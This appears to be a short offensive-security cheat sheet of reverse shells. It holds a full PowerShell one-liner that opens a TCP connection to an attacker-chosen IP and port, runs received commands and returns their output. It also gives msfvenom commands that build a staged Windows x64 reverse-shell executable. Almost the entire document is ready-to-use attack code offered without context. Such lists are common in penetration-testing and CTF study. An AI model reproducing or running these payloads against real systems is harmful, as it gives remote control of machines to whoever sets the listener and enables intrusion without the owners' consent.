# List of useful shells to keep on hand.

### Powershell reverse shell. Just need to replace IP and PORT of your choice and copy into cmd.exe or another method of executing commands.
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### msfvenom
* ```msfvenom -p <PAYLOAD> <OPTIONS>``` Standard syntax.
* ```<OS>/<arch>/<payload>``` Basic convention.
* ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>``` Windows x64 Reverse Shell in an exe format (staged).
